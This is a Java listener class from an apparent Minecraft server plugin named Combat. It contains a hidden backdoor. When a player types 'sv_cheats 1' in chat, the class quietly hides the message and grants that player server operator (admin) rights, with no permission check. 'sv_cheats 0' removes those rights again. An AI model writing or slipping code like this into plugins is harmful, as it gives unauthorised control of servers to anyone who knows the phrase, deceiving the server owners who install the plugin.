package org.main.uneton.heck;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.main.uneton.Combat;

public class HeckListener implements Listener {

    @EventHandler
    @Deprecated
    public void onPlayerChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        if (e.getMessage().contains("sv_cheats 1")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.sendActionBar("sv_cheats has changed to '1'");
                    p.setOp(true);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));

        } else if (e.getMessage().contains("sv_cheats 0")) {
            e.setCancelled(true);
            (new BukkitRunnable() {
                public void run() {
                    p.sendActionBar("sv_cheats has changed to '0'");
                    p.setOp(false);
                }
            }).runTask(JavaPlugin.getPlugin(Combat.class));
        }
    }
}
